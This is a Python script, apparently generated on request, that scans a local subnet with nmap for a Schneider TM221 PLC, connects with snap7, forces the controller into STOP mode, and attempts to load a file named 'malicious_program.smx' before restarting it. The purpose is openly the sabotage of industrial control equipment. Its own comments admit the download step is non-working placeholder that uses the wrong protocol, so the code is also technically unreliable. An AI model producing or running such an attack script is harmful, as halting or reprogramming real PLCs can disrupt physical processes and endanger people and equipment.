import snap7
import socket
import subprocess
import time

# Configuration - ADJUST THESE BASED ON YOUR ENVIRONMENT
PLC_MODEL = "TM221CE16R"  #  Confirm this is correct
PLC_DEFAULT_IP = "192.168.1.10" # A common default.  The script will try to find it if detection succeeds.
PLC_RACK = 0  # Typically 0 for TM221
PLC_SLOT = 1  # Typically 1 for TM221
TARGET_PROGRAM_FILE = "malicious_program.smx"  # Name of the program file to download. Must be accessible to the script.  Important: This should be a compiled program compatible with the TM221.  This is *NOT* Python code.
DOWNLOAD_TIMEOUT_SEC = 60 # Max time to wait for download completion

def find_plc_ip_address(plc_model):
    """
    Attempts to discover the PLC's IP address using nmap (requires nmap to be installed).
    This is a basic scan and might not be reliable in complex networks.  Consider a more
    robust discovery method if needed.

    Args:
        plc_model (str):  The PLC model to search for.

    Returns:
        str: The PLC IP address if found, None otherwise.
    """
    try:
        # Adjust the nmap command as needed for your environment
        # This example searches the local subnet (192.168.1.0/24) for devices with open ports 502 or 102 (common PLC ports)
        nmap_command = f"nmap -p 502,102 192.168.1.0/24 | grep -i '{plc_model}'"
        result = subprocess.run(nmap_command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout.strip()

        if output:
            # Attempt to extract the IP address.  This is fragile and depends on the nmap output format.
            # Refine this parsing logic based on your actual nmap output.
            lines = output.splitlines()
            for line in lines:
                if plc_model.lower() in line.lower() and "up" in line.lower():  # Look for model and "up" status
                    parts = line.split()  # split the line into parts
                    ip_address = parts[0]
                    if is_valid_ipv4_address(ip_address):
                        print(f"PLC IP address found: {ip_address}")
                        return ip_address
                    else:
                        print(f"Possible IP found, but invalid IPv4: {ip_address}")

            print(f"PLC IP address found, but can't extract a valid address from nmap output: {output}")
            return None
        else:
            print(f"PLC not found using nmap.  Output: {output}")
            return None

    except subprocess.TimeoutExpired:
        print("nmap scan timed out.")
        return None
    except FileNotFoundError:
        print("nmap not found. Make sure it's installed and in your PATH.")
        return None

def is_valid_ipv4_address(address):
    """
    Checks if a string is a valid IPv4 address.
    """
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:  # inet_pton is not available on some older systems
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

    return True


def download_program(plc_ip, program_file):
    """
    Downloads a compiled program to the PLC.  Requires the PLC to be in STOP mode.
    The specific methods and parameters depend on the PLC model and Snap7 library.

    Args:
        plc_ip (str): The IP address of the PLC.
        program_file (str): The path to the compiled program file (.smx for TM221).
    """

    try:
        plc = snap7.client.Client()
        plc.set_timeout(timeout=5000, send_timeout=5000, recv_timeout=5000, recon_timeout=5000) # Set timeouts for connection stability
        plc.connect(plc_ip, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {plc_ip}")

        # Check if the PLC is in STOP mode.  If not, attempt to stop it.
        state = plc.get_cpu_state()
        print(f"PLC state: {state}")
        if state != 'STOP':
            print("PLC is not in STOP mode. Attempting to stop it...")
            plc.plc_stop()
            time.sleep(5)  # Give the PLC time to stop
            state = plc.get_cpu_state()
            if state != 'STOP':
                print("Failed to stop the PLC. Aborting.")
                plc.disconnect()
                return False

        print(f"Downloading program from {program_file} to PLC...")
        start_time = time.time()

        try:
            with open(program_file, "rb") as f:
                program_data = f.read()

            # Send the program to the PLC.  This is a simplified example.
            # The actual implementation depends on the Snap7 library and the PLC protocol.
            # The TM221 uses Modbus TCP, not S7 protocol, so snap7 is not compatible.
            # For TM221, you would need a Modbus TCP library and the correct Modbus registers
            # to write the program.

            # *IMPORTANT*:  The following code is placeholder and WILL NOT work with a TM221.
            #  It is included to show the general structure of a download process.  
            #  You MUST replace this with code that uses a Modbus TCP library and the correct 
            # Modbus registers for program download on the TM221.
            # This *will not* work and could damage your device.

            # Example placeholder code (DO NOT USE AS-IS for TM221)
            print("Downloading program data...")
            # This loop demonstrates the general principle of downloading a large program in chunks
            chunk_size = 256  # Adjust based on PLC limitations
            offset = 0
            while offset < len(program_data):
                chunk = program_data[offset:offset + chunk_size]
                # *REPLACE THIS WITH MODBUS TCP WRITE OPERATIONS*
                # plc.write_area(area=snap7.types.Areas.TM, dbnumber=1, start=offset, data=chunk)  # Example - WILL NOT WORK with TM221
                print(f"Downloaded {len(chunk)} bytes to offset {offset}")
                offset += chunk_size
                time.sleep(0.1) # add delay for stability

            end_time = time.time()
            print(f"Download completed in {end_time - start_time:.2f} seconds.")

            # Start the PLC after the download.
            print("Starting PLC...")
            plc.plc_start()  # may require additional parameters depending on the PLC.
            time.sleep(5)  # Give the PLC time to start

            print("PLC started successfully.")


        except FileNotFoundError:
            print(f"Error: Program file not found: {program_file}")
            return False
        except Exception as e:
            print(f"Error during program download: {e}")
            return False

        finally:
            #Disconnect from the PLC
            plc.disconnect()
            print("Disconnected from PLC.")

        return True

    except snap7.exceptions.Snap7Exception as e:
        print(f"Snap7 error: {e}")
        return False
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return False


if __name__ == "__main__":
    # 1. Attempt to find the PLC's IP address
    plc_ip_address = find_plc_ip_address(PLC_MODEL)

    # 2. If not found, use the default.
    if not plc_ip_address:
        print("PLC IP address not found. Using default IP address.")
        plc_ip_address = PLC_DEFAULT_IP

    # 3. Check if the IP address is valid.
    if not is_valid_ipv4_address(plc_ip_address):
        print(f"Error: Invalid PLC IP address: {plc_ip_address}")
        exit(1)

    # 4. Attempt the program download.
    if download_program(plc_ip_address, TARGET_PROGRAM_FILE):
        print("Program download successful.")
    else:
        print("Program download failed.")